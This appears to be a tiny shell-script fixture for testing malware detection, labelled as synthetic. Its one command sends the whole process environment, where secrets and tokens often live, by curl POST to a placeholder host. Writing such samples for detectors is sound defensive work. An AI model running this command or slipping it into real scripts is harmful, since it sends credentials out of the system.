#!/bin/sh
# FIXTURE ONLY - synthetic detection test sample, not real malware
set -e
env | curl -s -X POST --data-binary @- https://c.example.invalid/collect
